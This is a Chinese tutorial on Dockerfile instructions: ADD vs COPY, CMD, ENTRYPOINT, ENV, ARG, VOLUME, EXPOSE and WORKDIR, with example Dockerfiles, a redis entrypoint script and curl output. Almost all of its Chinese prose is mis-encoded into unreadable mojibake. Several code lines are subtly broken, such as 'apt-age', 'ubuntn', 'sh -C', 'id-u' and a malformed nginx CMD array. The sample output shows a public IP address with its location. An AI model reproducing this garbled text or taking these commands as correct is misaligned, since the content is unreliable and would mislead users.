å¦‚æžœ&lt;æºè·¯å¾„&gt;ä¸ºä¸€ä¸ªtaråŽ‹ç¼©æ–‡ä»¶ï¼ŒåŽ‹ç¼©æ ¼å¼ä¸ºgzip,bzip2ä»¥åŠxzçš„æƒ…å†µä¸‹ï¼ŒADDæŒ‡ä»¤å°†ä¼šè‡ªåŠ¨è§£åŽ‹ç¼©è¿™ä¸ªåŽ‹ç¼©æ–‡ä»¶åˆ° &lt;ç›®æ ‡è·¯å¾„&gt;åŽ»ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè‡ªåŠ¨è§£åŽ‹åŠŸèƒ½éžå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚å®˜æ–¹é•œåƒubuntuä¸­ 12FROM scratchADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz / åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¸Œæœ›å¤åˆ¶åŽ‹ç¼©æ–‡ä»¶è€Œä¸è§£åŽ‹å°±ä¸ç”¨ADDå‘½ä»¤äº†ï¼Œåœ¨Dockerfileæœ€ä½³å®žè·µæ–‡æ¡£ä¸­è¦æ±‚ï¼Œå°½å¯èƒ½ä½¿ç”¨COPYï¼Œå› ä¸ºå®ƒçš„è¯­ä¹‰å¾ˆæ˜Žç¡®ï¼Œå°±æ˜¯å¤åˆ¶æ–‡ä»¶è€Œå·²ï¼Œè€ŒADDåˆ™åŒ…å«äº†æ›´å¤æ‚çš„åŠŸèƒ½ï¼Œå…¶è¡Œä¸ºä¹Ÿä¸ä¸€å®šå¾ˆæ¸…æ™°ã€‚æœ€é€‚åˆç”¨ADDçš„åœºåˆå°±æ˜¯æ‰€æåŠçš„éœ€è¦è‡ªåŠ¨è§£åŽ‹ç¼©çš„åœºåˆã€‚ADDæŒ‡ä»¤ä¼šä»¤é•œåƒæž„å»ºç¼“å­˜å¤±è´¥ï¼Œä»Žè€Œå¯èƒ½ä¼šä»¤é•œåƒæž„å»ºå˜å¾—æ¯”è¾ƒç¼“æ…¢ã€‚ å› æ­¤COPYä¸ŽADDæŒ‡ä»¤é€‰æ‹©å¯ä»¥éµå¾ªè¿™æ ·çš„åŽŸåˆ™ï¼Œæ‰€æœ‰æ–‡ä»¶å¤åˆ¶å‡ä½¿ç”¨COPYæŒ‡ä»¤ï¼Œä»…åœ¨éœ€è¦è‡ªåŠ¨è§£åŽ‹ç¼©çš„æ—¶å€™ä½¿ç”¨ADD CMDå®¹å™¨å¯åŠ¨å‘½ä»¤CMD æŒ‡ä»¤æ ¼å¼å’Œ RUNç›¸ä¼¼ï¼Œä¹Ÿæ˜¯ä¸¤ç§æ ¼å¼ï¼š shellæ ¼å¼ï¼šCMD&lt;å‘½ä»¤&gt; execæ ¼å¼ï¼šCMD[â€œå¯æ‰§è¡Œæ–‡ä»¶â€ï¼Œâ€œå‚æ•°1â€,â€å‚æ•°2â€â€¦] å‚æ•°åˆ—è¡¨æ ¼å¼ï¼šCMD[â€œå‚æ•°1â€,â€å‚æ•°2â€]ã€‚åœ¨æŒ‡å®šäº†ENTRYPOINTåŽï¼Œç”¨CMDæŒ‡å®šå…·ä½“å‚æ•° Dockerä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨å°±æ˜¯è¿›ç¨‹ï¼Œåœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™ï¼Œéœ€è¦æŒ‡å®šæ‰€è¿è¡Œçš„ç¨‹åºåŠå‚æ•°ã€‚CMDæŒ‡ä»¤å°±æ˜¯ç”¨æŒ‡å®šé»˜è®¤çš„å®¹å™¨ä¸»è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤ã€‚ åœ¨è¿è¡Œæ—¶å¯ä»¥æŒ‡å®šæ–°çš„å‘½ä»¤æ¥æç‚¹é•œåƒè®¾ç½®ä¸­çš„è¿™ä¸ªé»˜è®¤å‘½ä»¤ï¼Œæ¯”å¦‚ubuntué•œåƒé»˜è®¤çš„CMDæ˜¯/bin/bashï¼Œå¦‚æžœæˆ‘ä»¬ç›´æŽ¥docker run -it ubuntuçš„è¯ï¼Œä¼šç›´æŽ¥è¿›å…¥bashï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œçš„æ—¶å€™æŒ‡å®šè¿è¡Œåˆ«çš„å‘½ä»¤ï¼Œå¦‚ docker run -it ubuntn cat /etc/os-releaseï¼Œè¿™é‡Œå°±æ˜¯ä½¿ç”¨cat /etc/os-releaseå‘½ä»¤æ›¿æ¢äº†é»˜è®¤çš„ /bin/bashå‘½ä»¤ï¼Œè¾“å‡ºäº†ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ã€‚ åœ¨æŒ‡ä»¤æ ¼å¼ä¸Šï¼Œä¸€èˆ¬æŽ¨è execæ ¼å¼ï¼Œè¿™ç±»æ ¼å¼åœ¨è§£æžæ—¶ä¼šè¢«è§£æžä¸ºJSONæ•°ç»„ï¼Œå› æ­¤ä¸€å®šè¦ä½¿ç”¨åŒå¼•å·ï¼Œè€Œä¸æ˜¯å•å¼•å·ã€‚ä½¿ç”¨shellçš„è¯ï¼Œå®žé™…çš„å‘½ä»¤ä¼šè¢«åŒ…è£…ä¸ºsh-cçš„å‚æ•°çš„å½¢å¼è¿›è¡Œæ‰§è¡Œï¼Œæ¯”å¦‚ï¼š CMD echo \$HOME =ã€‹ CMD[â€œshâ€,â€-câ€,â€echo \$HOMEâ€] è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨çŽ¯å¢ƒå˜é‡çš„åŽŸå› ï¼Œå› æ­¤è¿™äº›çŽ¯å¢ƒå˜é‡ä¼šè¢«shellè¿›è¡Œè§£æžå¤„ç†ã€‚ Dockerä¸æ˜¯è™šæ‹Ÿæœºï¼Œå®¹å™¨çš„åº”ç”¨éƒ½åº”è¯¥æ˜¯ä»¥å‰å°è¿è¡Œï¼Œè€Œä¸æ˜¯åƒè™šæ‹Ÿæœºã€ç‰©ç†æœºç”¨upstart/systemdåŽ»å¯åŠ¨åŽå°æœåŠ¡ï¼Œå®¹å™¨æ²¡æœ‰åŽå°æœåŠ¡æ¦‚å¿µã€‚ä¸€äº›äººå°†CMDå†™ä¸ºï¼š CMD service nginx start ç„¶åŽå‘çŽ°å®¹å™¨æ‰§è¡ŒåŽç«‹å³é€€å‡ºäº†ï¼Œç”šè‡³åœ¨å®¹å™¨å†…åŽ»ä½¿ç”¨systemtclå‘½ä»¤ç»“æžœå´å‘çŽ°æ ¹æœ¬æ‰§è¡Œä¸äº†ã€‚ å¯¹äºŽå®¹å™¨è€Œè¨€ï¼Œå…¶å¯åŠ¨ç¨‹åºå°±æ˜¯å®¹å™¨åº”ç”¨è¿›ç¨‹ï¼Œå®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±æ˜¯åŽ»äº†ç”Ÿå­˜çš„æ„ä¹‰ï¼Œä»Žè€Œé€€å‡ºï¼Œå…¶ä»–è¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚ è€Œæ˜¯ç”¨ service nginx startå‘½ä»¤ï¼Œåˆ™æ˜¯å¸Œæœ›upstartæ¥ä»¥åŽå°å®ˆæŠ¤è¿›ç¨‹å½¢å¼å¯åŠ¨nginxï¼ŒCMD service nginx startå®žé™…ä¸Šæ˜¯ CMD[&quot;sh&quot;,&quot;-C&quot;,&quot;service nginx start&quot;]ï¼Œå› æ­¤ä¸»è¿›ç¨‹å®žé™…ä¸Šæ˜¯sh,å½“ service nginx startå‘½ä»¤ç»“æŸåŽï¼Œshä¹Ÿå°±ç»“æŸäº†ï¼Œshä½œä¸ºä¸»è¿›ç¨‹é€€å‡ºï¼Œè‡ªç„¶å®¹å™¨é€€å‡ºã€‚ æ­£ç¡®çš„åšæ³•æ˜¯ç›´æŽ¥æ‰§è¡Œnginxå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”è¦æ±‚å‰å°å½¢å¼è¿è¡Œï¼š CMD [â€œnginxâ€,â€-gâ€,â€daemon offâ€;] ENTRYPOINTå…¥å£ç‚¹ä¸ŽRUNæŒ‡ä»¤ä¸€æ ·ï¼Œåˆ†ä¸ºexecå’Œshellæ ¼å¼ã€‚ç›®çš„å’ŒCMDä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨æŒ‡å®šå®¹å™¨å¯åŠ¨ç¨‹åºåŠå‚æ•°ã€‚ENTRYPOINTåœ¨è¿è¡Œæ—¶ä¹Ÿå¯ä»¥æ›¿ä»£ï¼Œä¸è¿‡æ¯”CMDè¦ç•¥ç¹çï¼Œéœ€è¦é€šè¿‡ docker run â€“entrypointæŒ‡å®šã€‚ æŒ‡å®šENTRYPOINTåŽï¼ŒCMDçš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œä¸å†æ˜¯ç›´æŽ¥çš„è¿è¡Œå…¶å‘½ä»¤ï¼Œè€Œæ˜¯å°†CMDçš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ ç»™ENTRYPOINTæŒ‡ä»¤ï¼š â€œâ€œ æœ‰äº†CMDåŽï¼Œä¸ºä»€ä¹ˆè¿˜è¦æœ‰ENTRYPOINT? åœºæ™¯ä¸€ï¼šè®©é•œåƒå˜æˆåƒå‘½ä»¤ä¸€æ ·ä½¿ç”¨å‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¾—çŸ¥è‡ªå·±å½“å‰å…¬ç½‘IPçš„é•œåƒï¼Œå¯ä»¥ä½¿ç”¨CMDå®žçŽ° 12345FROM ubuntu:16.04RUN apt-age update \ &amp;&amp; apt-age install -y curl \ &amp;&amp; rm -rf /var/lib/apt/lists/*CMD ["curl","-s","http://ipinfo.cn"] ä½¿ç”¨ docker build -t myip .æ¥æž„å»ºé•œåƒçš„è¯ï¼Œå¦‚æžœæŸ¥è¯¢å½“å‰å…¬ç½‘çš„ipï¼Œåªéœ€è¦æ‰§è¡Œ 1docker run myip çŽ°åœ¨æŠŠé•œåƒå½“åšå‘½ä»¤ä½¿ç”¨ï¼Œå¦‚æžœå‘½ä»¤æœ‰å‚æ•°è¦æ€Žä¹ˆåŠ ä¸Šï¼ŸCMDä¸­å®žé™…çš„å‘½ä»¤æ˜¯curlï¼Œå¦‚æžœå¸Œæœ›å±•ç¤ºHTTPå¤´éƒ¨ä¿¡æ¯ï¼Œå°±éœ€è¦åŠ ä¸Š -iå‚æ•° 12docker run myip -idocker: Error response from daemon: invalid header field value "oci runtime error: container_linux.go:247: starting container process caused \"exec: \\\"-i\\\": executable file not found in $PATH\"\n". å¯ä»¥çœ‹åˆ°æ‰§è¡Œæ–‡ä»¶æ‰¾ä¸åˆ°çš„æŠ¥é”™ï¼Œexecutable file not foundã€‚åœ¨é•œåƒåŽé¢çš„æ˜¯ commandï¼Œè¿è¡Œæ—¶ä¼šæ›¿æ¢CMDçš„é»˜è®¤å€¼ï¼Œè¿™é‡Œçš„-iæ›¿æ¢äº†CMD,è€Œä¸æ˜¯åŠ åœ¨ curl -s http://ip.cnåŽé¢ã€‚è€Œ -iä¸æ˜¯å‘½ä»¤ï¼Œæ‰€ä»¥è‡ªç„¶æ‰¾ä¸åˆ°ã€‚ å¦‚æžœå¸Œæœ›åŠ å…¥ -iè¿™å‚æ•°ï¼Œå°±å¿…é¡»é‡æ–°å®Œæ•´çš„è¾“å…¥è¿™ä¸ªå‘½ä»¤ 1docker run myip curl -s http://ipinfo.cn -i è¿™æ˜¾ç„¶ä¸æ˜¯å¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œä½¿ç”¨ENTRYPOINTå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 12345FROM ubuntu:16.04RUN apt-get update \ &amp;&amp; apt-get install -y curl \ &amp;&amp; rm -rf /var/lib/apt/lists/*ENTRYPOINT ["curl","-s","http://ipinfo.cn"] è¿è¡Œ docker run myip -i 1234567891011121314151617181920212223242526272829303132333435docker@default:~/myip$ docker run myip&#123; "ip": "113.70.180.56", "city": "Foshan", "region": "Guangdong", "country": "CN", "loc": "23.0268,113.1315", "org": "AS4134 CHINANET-BACKBONE", "timezone": "Asia/Shanghai", "readme": "https://ipinfo.io/missingauth"&#125;docker@default:~/myip$ docker run myip -iHTTP/1.1 200 OKDate: Thu, 09 Jul 2020 03:16:44 GMTContent-Type: application/json; charset=utf-8Content-Length: 233Vary: Accept-EncodingAccess-Control-Allow-Origin: *X-Frame-Options: DENYX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffReferrer-Policy: strict-origin-when-cross-originSet-Cookie: flash=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMTVia: 1.1 googleExpires: Thu, 09 Jul 2020 03:16:44 GMTCache-Control: private&#123; "ip": "113.70.180.56", "city": "Foshan", "region": "Guangdong", "country": "CN", "loc": "23.0268,113.1315", "org": "AS4134 CHINANET-BACKBONE", "timezone": "Asia/Shanghai", "readme": "https://ipinfo.io/missingauth" å½“å­˜åœ¨ENTRYPOINTåŽï¼ŒCMDçš„å†…å®¹å°†ä¼šä½œä¸ºå‚æ•°ä¼ ç»™ENTRYPOINT,è€Œ -iå°±æ˜¯æ–°çš„CMD,å› æ­¤ä¼šä½œä¸ºå‚æ•°ä¼ ç»™curlã€‚ åœºæ™¯äºŒï¼šåº”ç”¨è¿è¡Œå‰çš„å‡†å¤‡å·¥ä½œå¯åŠ¨å®¹å™¨å°±æ˜¯å¯åŠ¨ä¸»è¿›ç¨‹ï¼Œæœ‰æ—¶å€™åœ¨å¯åŠ¨ä¸»è¿›ç¨‹å‰ï¼Œéœ€è¦ä¸€äº›å‡†å¤‡å·¥ä½œã€‚ ä¾‹å¦‚mysqlç±»çš„æ•°æ®åº“ï¼Œéœ€è¦ä¸€äº›æ•°æ®åº“é…ç½®ã€åˆå§‹åŒ–å·¥ä½œï¼Œè¿™äº›å·¥ä½œè¦åœ¨mysqlæœåŠ¡å™¨è¿è¡Œå‰è§£å†³ã€‚ å¦å¤–ï¼Œå¸Œæœ›é¿å…ä½¿ç”¨rootç”¨æˆ·åŽ»å¯åŠ¨æœåŠ¡ï¼Œä»Žè€Œæé«˜å®‰å…¨æ€§ï¼Œè€Œåœ¨å¯åŠ¨å‰è¿˜éœ€è¦ä»¥rootèº«ä»½æ‰§è¡Œä¸€äº›å¿…è¦çš„å‡†å¤‡å·¥ä½œï¼Œæœ€åŽåˆ‡æ¢åˆ°æœåŠ¡ç”¨æˆ·èº«ä»½å¯åŠ¨æœåŠ¡ã€‚æˆ–è€…é™¤äº†æœåŠ¡å¤–ï¼Œå…¶ä»–å‘½ä»¤ä¾æ—§å¯ä»¥ä½¿ç”¨rootèº«ä»½æ‰§è¡Œï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚ è¿™äº›å‡†å¤‡å·¥ä½œä¸Žå®¹å™¨CMDæ— å…³çš„ï¼Œæ— è®ºCMDä¸ºä»€ä¹ˆï¼Œéƒ½éœ€è¦äº‹å…ˆè¿›è¡Œä¸€ä¸ªé¢„å¤„ç†çš„å·¥ä½œï¼Œè¿™ç§æƒ…å†µå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ”¾å…¥åˆ°ENTRYPOINTä¸­åŽ»æ‰§è¡Œï¼Œè€Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¼šå°†æŽ¥æ”¶åˆ°çš„å‚æ•°ä¹Ÿå°±æ˜¯CMDçš„å‘½ä»¤ä½œä¸ºå‘½ä»¤ï¼Œåœ¨è„šæœ¬æœ€åŽæ‰§è¡Œï¼Œå®˜æ–¹é•œåƒrediså°±æ˜¯è¿™æ ·åšçš„ 12345678FROM alpine:3.4...RUN addgroup -S redis &amp;&amp; adduser -S -G redis redis...ENTRYPOINT ["docker-entrypoint.sh"]EXPOSE 6379CMD ["redis-server"] å¯ä»¥çœ‹åˆ°ä¸ºäº†redisæœåŠ¡åˆ›å»ºredisç”¨æˆ·ï¼Œå¹¶åœ¨æœ€åŽæŒ‡å®šäº†ENTRYPOINTä¸ºdocker-entrypoint.shè„šæœ¬ 123456789# !/bin/sh..# allow the container to be started with '--user'if ["$1"='redis-server' -a "$(id-u)"='0'];then chown -R redis . exec su-exec redis "$0" "$@"fiexec "$@" è„šæœ¬çš„å†…å®¹æ ¹æ®CMDçš„å†…å®¹æ¥åˆ¤æ–­å¦‚æžœæ˜¯redis-serverå°±åˆ‡æ¢åˆ°redisç”¨æˆ·èº«ä»½åŽ»å¯åŠ¨æœåŠ¡å™¨ï¼Œå¦åˆ™ä½¿ç”¨rootèº«ä»½æ‰§è¡Œ 12docker run -it redis iduid=0(root) git=0(root) groups=0(root) ENVè®¾ç½®çŽ¯å¢ƒå˜é‡æ ¼å¼ï¼š ENV&lt;key&gt;&lt;value&gt; ENV&lt;key1&gt;=&lt;value&gt; &lt;key2&gt;=&lt;value2&gt; è®¾ç½®çŽ¯å¢ƒå˜é‡ï¼Œæ— è®ºæ˜¯åŽé¢çš„å…¶ä»–æŒ‡ä»¤RUNï¼Œè¿˜æ˜¯è¿è¡Œæ—¶çš„å¼•ç”¨ï¼Œéƒ½å¯ä»¥ç›´æŽ¥ä½¿ç”¨è¿™é‡Œå®šä¹‰çš„çŽ¯å¢ƒå˜é‡ 123ENV VERSION=1.0 DEBUG=on \ NAME="Happy Feet"# æ¢è¡Œç¬¦ä»¥åŠå½“æœ‰ç©ºæ ¼çš„å€¼ç”¨åŒå¼•å·æ‹¬èµ·æ¥ å®šä¹‰äº†çŽ¯å¢ƒå˜é‡ï¼Œåœ¨åŽç»­çš„æŒ‡ä»¤é‡Œé¢å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªçŽ¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚å®˜æ–¹nodeé•œåƒDockerfileä¸­å¦ˆå°±æœ‰ç±»ä¼¼è¿™æ ·çš„ä»£ç  12345678ENV NODE_VERSION 7.2.0RUN curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz" \ &amp;&amp; curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc" \ &amp;&amp; gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \ &amp;&amp; grep " node-v$NODE_VERSION-linux-x64.tar.xz\$" SHASUMS256.txt | sha256sum -c - \ &amp;&amp; tar -xJf "node-v$NODE_VERSION-linux-x64.tar.xz" -C /usr/local --strip-components=1 \ &amp;&amp; rm "node-v$NODE_VERSION-linux-x64.tar.xz" SHASUMS256.txt.asc SHASUMS256.txt \ &amp;&amp; ln -s /usr/local/bin/node /usr/local/bin/nodejs å®šä¹‰äº†NODE_VERSIONçŽ¯å¢ƒå˜é‡ï¼Œå…¶åŽRUNè¿™å±‚ï¼Œå¤šæ¬¡ä½¿ç”¨$NODE_VERSIONæ¥è¿›è¡Œæ“ä½œå®šåˆ¶ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå‡çº§é•œåƒæž„å»ºç‰ˆæœ¬çš„æ—¶å€™ï¼Œåªè¦æ›´æ–°7.2.0æ—¢å¯ï¼Œæž„å»ºç»´æŠ¤å˜å¾—æ›´è½»æ¾äº† ä¸‹åˆ—çš„æŒ‡ä»¤å¯ä»¥æ”¯æŒçŽ¯å¢ƒå˜é‡å±•å¼€ï¼š ADD/COPY/ENV/EXPOSE/LABEL/USER/WORKDIR/VOLUME/STOPSIGNAL/ONBUILD ARGæž„å»ºå‚æ•°æ ¼å¼ï¼šARG&lt;å‚æ•°å&gt;[=&lt;é»˜è®¤å€¼&gt;] æž„å»ºå‚æ•°å’ŒENVçš„æ•ˆæžœä¸€æ ·ï¼Œéƒ½æ˜¯è®¾ç½®çŽ¯å¢ƒå˜é‡ï¼Œä¸åŒçš„æ˜¯ï¼ŒARGæ‰€è®¾ç½®çš„æž„å»ºçŽ¯å¢ƒçš„çŽ¯å¢ƒå˜é‡ï¼Œåœ¨å°†æ¥å®¹å™¨è¿è¡Œæ—¶æ˜¯ä¸ä¼šå­˜åœ¨è¿™äº›çŽ¯å¢ƒå˜é‡çš„ã€‚ä½†æ˜¯ä¸è¦å› æ­¤å°±ä½¿ç”¨ARGä¿å­˜å¯†ç ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸ºdocker historyè¿˜æ˜¯å¯ä»¥çœ‹åˆ°æ‰€æœ‰å€¼çš„ã€‚ Dockerfileä¸­ARGæŒ‡ä»¤æ˜¯å®šä¹‰å‚æ•°åç§°ï¼Œä»¥åŠå®šä¹‰å…¶é»˜è®¤å€¼ã€‚è¯¥é»˜è®¤å€¼å¯ä»¥åœ¨æž„å»ºå‘½ä»¤docker buildä¸­ç”¨ --build-arg&lt;å‚æ•°å&gt;=&lt;å€¼&gt;æ¥è¦†ç›–ã€‚ åœ¨1.13ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œè¦æ±‚ --build-argä¸­çš„å‚æ•°åï¼Œå¿…é¡»åœ¨Dockerfileä¸­ç”¨ARGå®šä¹‰è¿‡äº†ï¼Œå¦‚æžœæ²¡æœ‰åˆ™ä¼šæŠ¥é”™é€€å‡ºæž„å»ºã€‚åœ¨1.13ä¹‹åŽçš„ç‰ˆæœ¬ï¼Œåªæ˜¯æ˜¾ç¤ºè­¦å‘Šä¿¡æ¯ï¼Œå¹¶ç»§ç»­æž„å»ºã€‚è¿™å¯¹äºŽä½¿ç”¨CIç³»ç»Ÿï¼Œç”¨åŒæ ·çš„æž„å»ºæµç¨‹æž„å»ºä¸åŒçš„Dockerfileçš„æ—¶å€™æ¯”è¾ƒæœ‰å¸®åŠ©ï¼Œé¿å…æž„å»ºå‘½ä»¤å¿…é¡»æ ¹æ®æ¯ä¸ªDockerfileçš„å†…å®¹ä¿®æ”¹ VOLUMEå®šä¹‰åŒ¿åå·æ ¼å¼ä¸ºï¼š VOLUME[&quot;&lt;è·¯å¾„1&gt;&quot;,&quot;è·¯å¾„2&quot;...] VOLUME&lt;è·¯å¾„&gt; å®¹å™¨è¿è¡Œæ—¶åº”è¯¥å°½é‡ä¿æŒå®¹å™¨å­˜å‚¨å±‚ä¸å‘ç”Ÿå†™æ“ä½œï¼Œå¯¹äºŽæ•°æ®åº“éœ€è¦ä¿å­˜åŠ¨æ€æ•°æ®çš„åº”ç”¨ï¼Œå…¶æ•°æ®åº“æ–‡ä»¶åº”è¯¥ä¿å­˜äºŽå·ä¸­ï¼Œä¸ºäº†é˜²æ­¢è¿è¡Œæ—¶ç”¨æˆ·å¿˜è®°å°†åŠ¨æ€æ–‡ä»¶æ‰€ä¿å­˜ç›®å½•æŒ‚è½½ä¸ºå·ï¼Œåœ¨Dockerfileä¸­ï¼Œæˆ‘ä»¬å®žçŽ°æŒ‡å®šæŸäº›ç›®å½•æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œè¿™æ ·åœ¨è¿è¡Œæ—¶å¦‚æžœç”¨æˆ·ä¸æŒ‡å®šæŒ‚è½½ï¼Œå…¶åº”ç”¨ä¹Ÿå¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä¸ä¼šå‘å®¹å™¨å­˜å‚¨å±‚å†™å…¥å¤§é‡æ•°æ® VOLUME /data è¿™é‡Œçš„ /dataç›®å½•å°±ä¼šåœ¨è¿è¡Œæ—¶è‡ªåŠ¨æŒ‚è½½ä¸ºåŒ¿åå·ï¼Œä»»ä½•å‘ /dataä¸­å†™å…¥çš„ä¿¡æ¯éƒ½ä¸ä¼šè®°å½•è¿›å®¹å™¨å­˜å‚¨å±‚ï¼Œä»Žè€Œä¿è¯äº†å®¹å™¨å­˜å‚¨å±‚çš„æ— çŠ¶æ€åŒ–ã€‚è¿è¡Œæ—¶ä¹Ÿå¯ä»¥è¦†ç›–è¿™ä¸ªæŒ‚è½½è®¾ç½®ï¼š docker run -d -v mydata:/data xxx ä½¿ç”¨äº† mydataè¿™ä¸ªå‘½ä»¤å·æŒ‚è½½åˆ°äº† /dataè¿™ä¸ªä½ç½®ï¼Œæ›¿ä»£äº†Dockerfileä¸­å®šä¹‰çš„åŒ¿åå·çš„æŒ‚è½½é…ç½® EXPOSEå£°æ˜Žç«¯å£æ ¼å¼ä¸ºï¼šEXPOSE&lt;ç«¯å£1&gt;[&lt;ç«¯å£2&gt;...] EXPOSEæŒ‡ä»¤æ˜¯å£°æ˜Žè¿è¡Œæ—¶å®¹å™¨æä¾›æœåŠ¡ç«¯å£ï¼Œåœ¨è¿è¡Œæ—¶å¹¶ä¸ä¼šå› ä¸ºè¿™ä¸ªå£°æ˜Žåº”ç”¨å°±ä¼šå¼€å¯è¿™ä¸ªç«¯å£çš„æœåŠ¡ï¼Œåœ¨Dockerfileä¸­å†™å…¥è¿™æ ·çš„å£°æ˜Žæœ‰ä¸¤ä¸ªå¥½å¤„ï¼Œä¸€ä¸ªæ˜¯å¸®åŠ©é•œåƒä½¿ç”¨è€…ç†è§£è¿™ä¸ªé•œåƒæœåŠ¡çš„å®ˆæŠ¤ç«¯å£ï¼Œä»¥æ–¹ä¾¿é…ç½®æ˜ å°„ï¼›å¦ä¸€ä¸ªå¥½å¤„å°±æ˜¯è¿è¡Œæ—¶ä½¿ç”¨éšæœºç«¯å£æ˜ å°„æ—¶ï¼Œä¹Ÿå°±æ˜¯docker run -Pæ—¶ï¼Œä¼šè‡ªåŠ¨éšæœºæ˜ å°„EXPOSEç«¯å£ åœ¨æ—©æœŸDockerç‰ˆæœ¬ä¸­è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šç”¨å¤„ï¼Œä»¥å‰æ‰€æœ‰çš„å®¹å™¨éƒ½æ˜¯è¿è¡ŒäºŽé»˜è®¤æ¡¥æŽ¥ç½‘ç»œä¸­ï¼Œå› æ­¤æ‰€æœ‰å®¹å™¨äº’ç›¸ä¹‹é—´éƒ½å¯ä»¥ç›´æŽ¥è®¿é—®ï¼Œè¿™æ ·å­˜åœ¨ä¸€å®šçš„å®‰å…¨æ€§é—®é¢˜ã€‚äºŽæ˜¯æœ‰äº†ä¸€ä¸ªDockerå¼•æ“Žå‚æ•° --icc=falseï¼Œå½“æŒ‡å®šè¯¥å‚æ•°åŽï¼Œå®¹å™¨é—´å°†é»˜è®¤æ— æ³•äº’è®¿ï¼Œé™¤éžäº’ç›¸ä½¿ç”¨äº†--linkså‚æ•°çš„å®¹å™¨æ‰å¯ä»¥äº’é€šï¼Œå¹¶ä¸”åªæœ‰é•œåƒä¸­EXPOSEæ‰€å£°æ˜Žçš„ç«¯å£æ‰å¯ä»¥è¢«è®¿é—®ã€‚è¿™ä¸ª -icc=falseçš„ç”¨æ³•åœ¨å¼•å…¥äº†docker networkåŽå·²ç»åŸºæœ¬ä¸ç”¨äº†ï¼Œé€šè¿‡è‡ªå®šä¹‰ç½‘ç»œå¯ä»¥è½»æ¾å®žçŽ°å®¹å™¨é—´çš„äº’è”ä¸Žéš”ç¦»ã€‚ è¦å°† EXPOSEå’Œåœ¨è¿è¡Œæ—¶ä½¿ç”¨ -p &lt;å®¿ä¸»ç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt;åŒºåˆ†å¼€ï¼Œ-pæ˜¯æ˜ å°„å®¿ä¸»ç«¯å£å’Œå®¹å™¨ç«¯å£ï¼Œä¹Ÿå°±æ˜¯å°†å®¹å™¨çš„å¯¹åº”ç«¯å£æœåŠ¡å…¬å¼€ç»™å¤–ç•Œè®¿é—®ï¼Œè€ŒEXPOSEä»…ä»…æ˜¯å£°æ˜Žå®¹å™¨æ‰“ç®—ä½¿ç”¨ä»€ä¹ˆç«¯å£è€Œå·²ï¼Œå¹¶ä¸ä¼šè‡ªåŠ¨åœ¨å®¿èˆè¿›è¡Œæ˜ å°„ã€‚ WORKDIRæŒ‡å®šå·¥ä½œç›®å½•æ ¼å¼ï¼šWORKDIR&lt;å·¥ä½œç›®å½•è·¯å¾„&gt; ä½¿ç”¨WORKDIRæŒ‡ä»¤å¯ä»¥æ¥æŒ‡å®šå·¥ä½œç›®å½•ï¼ˆæˆ–è€…ç§°ä¸ºå½“å‰ç›®å½•ï¼‰ï¼Œä»¥åŽå„å±‚çš„ç›®å½•å°±è¢«æ”¹æˆæŒ‡å®šç›®å½•ï¼Œå¦‚è¯¥ç›®å½•ä¸å­˜åœ¨ï¼ŒWORKDIRå°±ä¼šå¸®ä½ å»ºç«‹ç›®å½• é”™è¯¯ä¾‹å­ï¼š RUN cd /app RUN echo â€œhelloâ€ &gt; world.txt æŠŠDockerfileå½“åšShellè„šæœ¬æ¥ä¹¦å†™ï¼Œæž„å»ºé•œåƒè¿è¡ŒåŽï¼Œä¼šå‘çŽ°æ‰¾ä¸åˆ° /app/world.txtæ–‡ä»¶ï¼Œæˆ–è€…å…¶å†…å®¹ä¸æ˜¯hello.åœ¨shellä¸­ï¼Œè¿žç»­ä¸¤è¡Œæ˜¯åŒä¸€ä¸ªè¿›ç¨‹æ‰§è¡ŒçŽ¯å¢ƒï¼Œå› æ­¤å‰ä¸€ä¸ªå‘½ä»¤ä¿®æ”¹çš„å†…å­˜çŠ¶æ€ï¼Œä¼šç›´æŽ¥å½±å“ä¸‹ä¸€ä¸ªå‘½ä»¤ï¼›è€Œåœ¨Dockerfileä¸­ï¼Œè¿™ä¸¤è¡ŒRUNå‘½ä»¤çš„æ‰§è¡ŒçŽ¯å¢ƒæ 